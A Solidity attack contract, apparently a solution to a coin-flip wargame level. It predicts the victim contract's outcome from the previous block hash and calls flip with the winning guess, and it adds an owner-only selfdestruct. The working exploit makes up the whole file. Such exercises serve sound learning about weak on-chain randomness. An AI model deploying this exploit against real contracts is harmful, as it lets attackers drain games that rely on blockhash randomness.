// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface CoinFlip {
  function flip(bool _guess) external returns (bool);
}

contract AttackCoinFlip {
  uint256 internal factor = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  uint256 internal lastHash;
  address payable internal _owner;

  constructor() {
    _owner = payable(msg.sender);
  }

  modifier onlyOwner {
    require(msg.sender == _owner, "expects to be called by owner");
    _;
  }

  function attack(address victom) public onlyOwner {

    uint256 blockValue = uint256(blockhash(block.number - 1));

    if (lastHash == blockValue) {
      revert("cannot be run twice in one block");
    }

    lastHash = blockValue;

    uint256 coinFlip = blockValue / factor;
    bool side = coinFlip == 1 ? true : false;
    CoinFlip(victom).flip(side);
  }


  function kill() public onlyOwner {
    selfdestruct(_owner);
  }
}
